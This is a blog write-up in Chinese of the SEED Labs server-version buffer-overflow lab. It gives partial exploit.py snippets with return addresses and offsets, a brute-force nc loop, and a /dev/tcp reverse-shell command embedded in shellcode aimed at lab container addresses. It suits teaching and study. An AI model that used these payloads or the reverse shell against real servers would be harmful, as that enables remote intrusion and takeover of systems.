@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Lab Environment Setup 下载解压好 Labset.zip 文件 关闭地址随机化，sudo &#x2F;sbin&#x2F;sysctl -w kernel.randomize_va_space&#x3D;0 阅读并编译被攻击的程序，cd server-code &amp;&amp; make &amp;&amp; make install 启动容器，dcbuild &amp;&amp; dcup ，提供的别">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buffer-Overflow-Attack-Lab(Server-Version)">
+<meta property="og:url" content="https://ceyewan.github.io/p/a7d9c628.html">
+<meta property="og:site_name" content="Ceyewan&#39;s Blog">
+<meta property="og:description" content="Lab Environment Setup 下载解压好 Labset.zip 文件 关闭地址随机化，sudo &#x2F;sbin&#x2F;sysctl -w kernel.randomize_va_space&#x3D;0 阅读并编译被攻击的程序，cd server-code &amp;&amp; make &amp;&amp; make install 启动容器，dcbuild &amp;&amp; dcup ，提供的别">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113143729110.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113144245106.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113144910199.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113145627558.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113151028713.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113152426964.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113155358573.png">
+<meta property="article:published_time" content="2022-11-14T06:13:03.000Z">
+<meta property="article:modified_time" content="2024-03-28T16:22:46.285Z">
+<meta property="article:author" content="ceyewan">
+<meta property="article:tag" content="Buffer-Overflow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113143729110.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icons.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon-apple-touch.png">
+        
+      
+    
+    <!-- title -->
+    <title>Buffer-Overflow-Attack-Lab(Server-Version)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/p/a4ae304e.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/p/958ee7cd.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/a7d9c628.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/a7d9c628.html&text=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/a7d9c628.html&title=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/a7d9c628.html&is_video=false&description=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Buffer-Overflow-Attack-Lab(Server-Version)&body=Check out this article: https://ceyewan.github.io/p/a7d9c628.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/a7d9c628.html&title=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/a7d9c628.html&title=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/a7d9c628.html&title=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/a7d9c628.html&title=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/a7d9c628.html&name=Buffer-Overflow-Attack-Lab(Server-Version)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/a7d9c628.html&t=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab-Environment-Setup"><span class="toc-number">1.</span> <span class="toc-text">Lab Environment Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Get-Familiar-with-the-Shellcode"><span class="toc-number">2.</span> <span class="toc-text">Task 1: Get Familiar with the Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Level-1-Attack"><span class="toc-number">3.</span> <span class="toc-text">Task 2: Level-1 Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Level-2-Attack"><span class="toc-number">4.</span> <span class="toc-text">Task 3: Level-2 Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Level-3-Attack"><span class="toc-number">5.</span> <span class="toc-text">Task 4: Level-3 Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Level-4-Attack"><span class="toc-number">6.</span> <span class="toc-text">Task 5: Level-4 Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-6-Experimenting-with-the-Address-Randomization"><span class="toc-number">7.</span> <span class="toc-text">Task 6: Experimenting with the Address Randomization</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tasks-7-Experimenting-with-Other-Countermeasures"><span class="toc-number">8.</span> <span class="toc-text">Tasks 7: Experimenting with Other Countermeasures</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Turn-on-the-StackGuard-Protection"><span class="toc-number">8.1.</span> <span class="toc-text">Turn on the StackGuard Protection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Turn-on-the-Non-executable-Stack-Protection"><span class="toc-number">8.2.</span> <span class="toc-text">Turn on the Non-executable Stack Protection</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Buffer-Overflow-Attack-Lab(Server-Version)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ceyewan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-14T06:13:03.000Z" class="dt-published" itemprop="datePublished">2022-11-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/SeedLabs-SoftwareSecurity/">SeedLabs/SoftwareSecurity</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Buffer-Overflow/" rel="tag">Buffer-Overflow</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Lab-Environment-Setup"><a href="#Lab-Environment-Setup" class="headerlink" title="Lab Environment Setup"></a>Lab Environment Setup</h2><ol>
+<li>下载解压好 Labset.zip 文件</li>
+<li>关闭地址随机化，<code>sudo /sbin/sysctl -w kernel.randomize_va_space=0</code></li>
+<li>阅读并编译被攻击的程序，<code>cd server-code &amp;&amp; make &amp;&amp; make install</code></li>
+<li>启动容器，<code>dcbuild &amp;&amp; dcup</code> ，提供的别名只能在 bash 中使用，如果要在 zsh 中用需要自己设置一下 alias</li>
+</ol>
+<h2 id="Task-1-Get-Familiar-with-the-Shellcode"><a href="#Task-1-Get-Familiar-with-the-Shellcode" class="headerlink" title="Task 1: Get Familiar with the Shellcode"></a>Task 1: Get Familiar with the Shellcode</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> shellcode</span><br><span class="line">./shellcode_32.py</span><br><span class="line">./shellcode_64.py</span><br><span class="line">make</span><br><span class="line">./a32.out</span><br><span class="line">./a64.out</span><br></pre></td></tr></table></figure>
+
+<p>要实现删除操作，改一改命令就可以了，需要确保长度不变！这里我们熟悉一下 shellcode 的作用就 ok</p>
+<h2 id="Task-2-Level-1-Attack"><a href="#Task-2-Level-1-Attack" class="headerlink" title="Task 2: Level-1 Attack"></a>Task 2: Level-1 Attack</h2><p>客户端向服务端发送一个字符串，服务端会将这个字符串作为标准输入，执行 stack 程序，并且把 stack 程序的输出在 dcup 的窗口显示出来。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113143729110.png" alt="image-20221113143729110"></p>
+<p>我们把 shellcode 复制过来，修改一些参数，实施缓冲区溢出实验。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113144245106.png" alt="image-20221113144245106"></p>
+<p>结果如下，注意每次重启容器，地址都会发生变化，我重启了一下，所以地址和上面的代码不相匹配。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113144910199.png" alt="image-20221113144910199"></p>
+<p>为了实现反向 shell，只需要把 ls 那一行命令修改为 <code>/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1</code> 就 ok 了，剩下的不用动，注意长度。（具体实现原理 shellshock 实验讲过了）</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113145627558.png" alt="image-20221113145627558"></p>
+<h2 id="Task-3-Level-2-Attack"><a href="#Task-3-Level-2-Attack" class="headerlink" title="Task 3: Level-2 Attack"></a>Task 3: Level-2 Attack</h2><p>只知道 buffer 的地址，不知道 ebp 的地址，但是知道 buffer 的大小为 100 到 300，那么 ebp 比 &amp;buffer 最小大 100，最多大 308（感觉是这个数，也可以再大点）。当 ebp 比 &amp;buffer 大 308 时，ret 至少要大 312，所以我们就能取 312。这个数还能再大点，但是太大了也不行，太大了后面就没有空间存 shellcode 了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ret = <span class="number">0xffffd4b8</span> + <span class="number">312</span>     <span class="comment"># Change this number</span></span><br><span class="line"><span class="comment"># offset = 0x70 + 4              # Change this number</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">312</span>, <span class="number">4</span>):</span><br><span class="line">    content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113151028713.png" alt="image-20221113151028713"></p>
+<h2 id="Task-4-Level-3-Attack"><a href="#Task-4-Level-3-Attack" class="headerlink" title="Task 4: Level-3 Attack"></a>Task 4: Level-3 Attack</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span>               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value</span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret = <span class="number">0x00007fffffffe3e0</span>     <span class="comment"># Change this number</span></span><br><span class="line">offset = <span class="number">216</span>              <span class="comment"># Change this number</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>和 Setuid 版本差不多，不过多了个服务器罢了。难度却大大降低，因为直接把地址都给了，Setuid 版不给地址，只能自己通过 GDB 调试得到地址，并且 GDB 调试出来的地址还和实际运行的地址有偏移。这个就没这种问题，把 shellcode 放最前面就可以了。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113152426964.png" alt="image-20221113152426964"></p>
+<h2 id="Task-5-Level-4-Attack"><a href="#Task-5-Level-4-Attack" class="headerlink" title="Task 5: Level-4 Attack"></a>Task 5: Level-4 Attack</h2><p>同 Setuid 版，在 main 函数中还有一份字符串啊，所以我们可以调用 main 函数中的那个 shellcode，但是不知道地址，也没法用 GDB。所以只能用暴力法了。k y l</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)  <span class="comment"># Change this number 放最后面，比较好找到，因为前面是 nop</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value</span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret = <span class="number">0x00007fffffffe4b0</span> + <span class="built_in">int</span>(sys.argv[<span class="number">1</span>]) <span class="comment"># Change this number 反正比 rbp 要大，大多少不知道了</span></span><br><span class="line"><span class="built_in">print</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">offset = <span class="number">104</span>              <span class="comment"># Change this number</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后写个小脚本，如下，我这里是每次增加 100，也可以改的更精细一点，这样容错率更高：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">value=0k y l</span><br><span class="line"></span><br><span class="line">while true; do</span><br><span class="line">  value=$(( $value + 100 ))</span><br><span class="line">  ./exploit.py $value</span><br><span class="line">  cat badfile | nc 10.9.0.8 9090</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>执行情况如下，在偏移 1200 的情况下就可以了：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113155358573.png" alt="image-20221113155358573"></p>
+<h2 id="Task-6-Experimenting-with-the-Address-Randomization"><a href="#Task-6-Experimenting-with-the-Address-Randomization" class="headerlink" title="Task 6: Experimenting with the Address Randomization"></a>Task 6: Experimenting with the Address Randomization</h2><p>打开地址随机化后，每次地址都不一样了，但是对于 32 位地址来说，情况还是有限的，我们可以使用脚本穷举解决问题。脚本已经给了，跑一跑就好了。</p>
+<h2 id="Tasks-7-Experimenting-with-Other-Countermeasures"><a href="#Tasks-7-Experimenting-with-Other-Countermeasures" class="headerlink" title="Tasks 7: Experimenting with Other Countermeasures"></a>Tasks 7: Experimenting with Other Countermeasures</h2><h3 id="Turn-on-the-StackGuard-Protection"><a href="#Turn-on-the-StackGuard-Protection" class="headerlink" title="Turn on the StackGuard Protection"></a>Turn on the StackGuard Protection</h3><p>打开栈溢出保护机制，当存在栈溢出时就会报错。具体实现就是会有一个哨兵在栈底，如果栈溢出了就会改变哨兵的值，检测到哨兵的值发生改变了，那么就会抛出错误。</p>
+<h3 id="Turn-on-the-Non-executable-Stack-Protection"><a href="#Turn-on-the-Non-executable-Stack-Protection" class="headerlink" title="Turn on the Non-executable Stack Protection"></a>Turn on the Non-executable Stack Protection</h3><p>栈不可执行机制，只是栈不能执行罢了，可以通过 ret2libc 或者 ROP 等技术破解之。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab-Environment-Setup"><span class="toc-number">1.</span> <span class="toc-text">Lab Environment Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Get-Familiar-with-the-Shellcode"><span class="toc-number">2.</span> <span class="toc-text">Task 1: Get Familiar with the Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Level-1-Attack"><span class="toc-number">3.</span> <span class="toc-text">Task 2: Level-1 Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Level-2-Attack"><span class="toc-number">4.</span> <span class="toc-text">Task 3: Level-2 Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Level-3-Attack"><span class="toc-number">5.</span> <span class="toc-text">Task 4: Level-3 Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Level-4-Attack"><span class="toc-number">6.</span> <span class="toc-text">Task 5: Level-4 Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-6-Experimenting-with-the-Address-Randomization"><span class="toc-number">7.</span> <span class="toc-text">Task 6: Experimenting with the Address Randomization</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tasks-7-Experimenting-with-Other-Countermeasures"><span class="toc-number">8.</span> <span class="toc-text">Tasks 7: Experimenting with Other Countermeasures</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Turn-on-the-StackGuard-Protection"><span class="toc-number">8.1.</span> <span class="toc-text">Turn on the StackGuard Protection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Turn-on-the-Non-executable-Stack-Protection"><span class="toc-number">8.2.</span> <span class="toc-text">Turn on the Non-executable Stack Protection</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/a7d9c628.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/a7d9c628.html&text=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/a7d9c628.html&title=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/a7d9c628.html&is_video=false&description=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Buffer-Overflow-Attack-Lab(Server-Version)&body=Check out this article: https://ceyewan.github.io/p/a7d9c628.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/a7d9c628.html&title=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/a7d9c628.html&title=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/a7d9c628.html&title=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/a7d9c628.html&title=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/a7d9c628.html&name=Buffer-Overflow-Attack-Lab(Server-Version)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/a7d9c628.html&t=Buffer-Overflow-Attack-Lab(Server-Version)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+  </div>
+  <div class="footer-left">
+    ceyewan
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
